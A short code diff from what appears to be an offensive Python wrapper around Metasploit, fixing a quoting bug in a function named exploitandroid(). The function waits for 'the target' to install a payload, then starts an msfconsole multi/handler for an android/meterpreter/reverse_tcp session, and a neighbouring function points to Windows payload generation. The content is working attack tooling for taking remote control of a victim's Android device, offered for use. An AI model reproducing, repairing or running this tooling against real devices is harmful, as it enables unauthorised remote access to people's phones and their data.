@@ -207,7 +207,7 @@ def exploitandroid():
     prYellow("make sure the target installed the payload")    
     time.sleep(10)
     os.system('cd $HOME ')
-    os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run")
+    os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run'")
 def generatewindowspayload():
      print("We recommend learning Windows Payloads manually. There is a lot to learn")
      os.system ("cd $HOME")
